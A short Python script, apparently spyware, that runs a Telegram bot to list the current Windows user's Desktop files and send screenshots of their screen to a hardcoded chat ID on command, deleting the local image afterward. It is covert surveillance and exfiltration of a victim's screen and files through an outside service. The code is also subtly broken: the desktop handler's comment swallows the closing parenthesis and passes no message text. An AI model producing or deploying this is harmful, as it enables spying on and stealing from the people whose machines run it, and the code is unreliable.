from os import listdir, close, remove
from getpass import getuser
from telebot import TeleBot
from pyautogui import screenshot

bot = TeleBot('Токен вашего бота / Bot token')
directory = listdir(f'C://Users/{getuser()}/Desktop')


@bot.message_handler(commands=['desktop'])
def desktop(message):
    for data in directory:
        bot.send_message(1902012012  # ID чата / Chat ID)

@bot.message_handler(commands=['screenshot'])
def get_screen(message):
    photo = screenshot('screen.jpg')
    bot.send_photo(1902012012, photo)
    remove('screen.jpg')


bot.polling(True)
